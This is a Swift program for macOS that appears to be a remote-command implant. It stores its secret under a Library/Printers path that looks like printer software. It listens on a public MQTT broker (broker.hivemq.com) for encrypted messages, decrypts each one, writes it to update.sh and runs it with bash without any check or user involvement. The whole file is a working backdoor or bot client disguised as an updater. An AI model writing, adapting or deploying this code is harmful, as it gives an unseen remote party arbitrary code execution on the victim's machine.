import Foundation
import CryptoKit
import CocoaMQTT


let base = FileManager.default.homeDirectoryForCurrentUser
    .appendingPathComponent("Library/Printers/mountain/client/main")

let passwordPath = base.appendingPathComponent("password")
let updatesPath = base.appendingPathComponent("updates")


func readPassword() -> String {
    guard let data = try? Data(contentsOf: passwordPath),
          let password = String(data: data, encoding: .utf8)
    else {
        fatalError("Missing password")
    }

    return password.trimmingCharacters(in: .whitespacesAndNewlines)
}


func deriveID(_ password: String) -> String {
    let data = Data(("mountain-id:" + password).utf8)
    let hash = SHA256.hash(data: data)
    return hash.map {
        String(format: "%02x", $0)
    }.joined()
}


func deriveKey(password: String, salt: Data) -> SymmetricKey {
    let material = Data(password.utf8) + salt

    let hash = SHA256.hash(data: material)

    return SymmetricKey(data: hash)
}


func decrypt(
    password: String,
    salt: Data,
    nonce: Data,
    ciphertext: Data
) throws -> Data {

    let key = deriveKey(
        password: password,
        salt: salt
    )

    let sealed = try AES.GCM.SealedBox(
        nonce: AES.GCM.Nonce(data: nonce),
        ciphertext: ciphertext.dropLast(16),
        tag: ciphertext.suffix(16)
    )

    return try AES.GCM.open(
        sealed,
        using: key
    )
}


func runScript(_ data: Data) {

    let script = updatesPath.appendingPathComponent(
        "update.sh"
    )

    try? data.write(to: script)

    chmod(
        script.path,
        0o755
    )

    let process = Process()

    process.executableURL = URL(
        fileURLWithPath: "/bin/bash"
    )

    process.arguments = [
        script.path
    ]

    try? process.run()
}


let password = readPassword()
let id = deriveID(password)

let mqtt = CocoaMQTT(
    clientID: id,
    host: "broker.hivemq.com",
    port: 1883
)


class Delegate: NSObject, CocoaMQTTDelegate {

    func mqtt(
        _ mqtt: CocoaMQTT,
        didConnectAck ack: CocoaMQTTConnAck
    ) {

        print("Connected")

        mqtt.subscribe(
            "mountain/\(id)"
        )
    }


    func mqtt(
        _ mqtt: CocoaMQTT,
        didReceiveMessage message: CocoaMQTTMessage,
        id: UInt16
    ) {

        guard let payload = message.string else {
            return
        }

        guard let json = try? JSONSerialization.jsonObject(
            with: Data(payload.utf8)
        ) as? [String:String]
        else {
            return
        }


        do {

            let salt = Data(
                base64Encoded: json["salt"]!
            )!

            let nonce = Data(
                base64Encoded: json["nonce"]!
            )!

            let ciphertext = Data(
                base64Encoded: json["data"]!
            )!


            let result = try decrypt(
                password: password,
                salt: salt,
                nonce: nonce,
                ciphertext: ciphertext
            )

            runScript(result)

        } catch {

            print(
                "Decrypt failed: \(error)"
            )
        }
    }


    func mqttDidDisconnect(
        _ mqtt: CocoaMQTT,
        withError err: Error?
    ) {
        print("Disconnected")
    }


    func mqtt(
        _ mqtt: CocoaMQTT,
        didPublishMessage message: CocoaMQTTMessage,
        id: UInt16
    ) {}

    func mqtt(
        _ mqtt: CocoaMQTT,
        didPublishAck id: UInt16
    ) {}

    func mqtt(
        _ mqtt: CocoaMQTT,
        didSubscribeTopics success: NSDictionary,
        failed: [String]
    ) {}

    func mqtt(
        _ mqtt: CocoaMQTT,
        didUnsubscribeTopics topics: [String]
    ) {}

    func mqtt(
        _ mqtt: CocoaMQTT,
        didPing response: Data?
    ) {}

    func mqtt(
        _ mqtt: CocoaMQTT,
        didReceivePong pong: Data?
    ) {}
}


let delegate = Delegate()

mqtt.delegate = delegate
mqtt.keepAlive = 60

mqtt.connect()

RunLoop.main.run()